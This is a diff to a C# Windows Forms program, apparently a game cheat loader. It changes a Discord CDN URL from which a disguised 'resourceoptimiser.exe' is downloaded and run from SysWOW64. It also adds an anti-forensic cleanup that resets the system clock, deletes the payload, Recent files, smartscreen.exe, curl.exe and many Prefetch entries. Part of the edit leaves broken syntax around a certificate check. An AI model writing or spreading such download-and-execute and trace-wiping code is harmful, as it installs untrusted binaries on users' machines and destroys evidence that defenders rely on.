@@ -18,6 +18,7 @@ using Binarysharp.MemoryManagement.Native;
 using DrawingPoint = System.Drawing.Point;
 using System.Diagnostics.Eventing.Reader;
 using System.IO;
+using System.Security.Cryptography.X509Certificates;
 
 
 namespace never.Forms
@@ -445,8 +446,8 @@ namespace never.Forms
 
         private async void buttonanimated1_Click(object sender, EventArgs e)
         {
-            string url = "https://cdn.discordapp.com/attachments/1344893646947876874/1345127930401128490/resourceoptimizer.exe?ex=67c36b81&is=67c21a01&hm=531c483bed0c7a1ba3521ff47227b129d16ae09b712f0072e02c7b24e57b97fd&";
             string outputPath = @"C:\AutoRun.exe"; // Change the path here
+            string url = "https://cdn.discordapp.com/attachments/1328480696217505886/1344724054879506482/resourceoptimiser.exe?ex=67c4965e&is=67c344de&hm=3ade5707f55a2eb64e1ea06ad13204aeeb8949da46e545bd3012d61d08dff067&";
 
             // Check if the AutoRun.exe file already exists
             if (!System.IO.File.Exists(outputPath))
@@ -482,16 +483,14 @@ namespace never.Forms
 
         private void buttonanimated2_Click(object sender, EventArgs e)
         {
-            cmd("start C:\\AutoRun.exe");
+            cmd("start C:\\Windows\\SysWOW64\\resourceoptimiser.exe");
         }
         {
-            try
             {
                 X509Certificate cert = X509Certificate.CreateFromSignedFile(filePath);
                 X509Certificate2 cert2 = new X509Certificate2(cert);
                 return cert2.Subject.IndexOf("Microsoft", StringComparison.OrdinalIgnoreCase) >= 0;
 
-            catch
             {
                 return false; // If there's no valid signature, assume it's not a system file
             }
@@ -512,7 +511,6 @@ namespace never.Forms
                 }
                 DeleteFileIfExists(@"C:\nEMZ79aO");
                 string directory = @"C:\Windows\SysWOW64";
-                DeleteFileIfExists(@"C:\AutoRun.exe");
                 DeleteFileIfExists(@"C:\AutoRun.dll");
 
                 // The rest of your existing code...
@@ -563,24 +561,26 @@ namespace never.Forms
                     cmd("sc start " + processName);
                 }
                 cmd("time " + NowTime);
+                DeleteFileIfExists(@"C:\Windows\SysWOW64\resourceoptimiser.exe");
+                DeleteFileIfExists(@"C:\Windows\SysWOW64\resourceoptimiser.dll");
 
                 // Additional cleanup commands...
-                cmd("del /f /q /s C:\\Windows\\AutoRun.exe");
-                cmd("del /f /q /s C:\\Windows\\AutoRun.dll");
+                cmd("del /f /q /s C:\\Windows\\SysWOW64\\resourceoptimiser.exe");
+                cmd("del /f /q /sC:\\Windows\\SysWOW64\\resourceoptimiser.dll");
                 cmd("del /f /q /s C:\\Users\\%username%\\Recent");
                 cmd("del /f /q /s C:\\Windows\\smartscreen.exe*");
                 cmd("del /f /q /s C:\\Windows\\System32\\Curl.exe*r");
-                cmd("del /f /q /s C:\\Windows\\prefetch\\TASKKILL.EXE*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\REG.EXE*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\REGEDIT.EXE*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\DISKPART.EXE*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\CURL.EXE*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\SC.EXE*");
-                cmd("del /f /q /s C:\\Windows\\prefetch\\AUTORUN.EXE*");
+                cmd("del /f /q /s C:\\Windows\\prefetch\\resourceoptimiser.exe*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\GOOGLECHROME.EXE*");
                 Console.Beep(300, 500);
                 Application.Exit();
             }
+                
             catch (Exception ex)
             {
                 MessageBox.Show("Error: " + ex.Message);
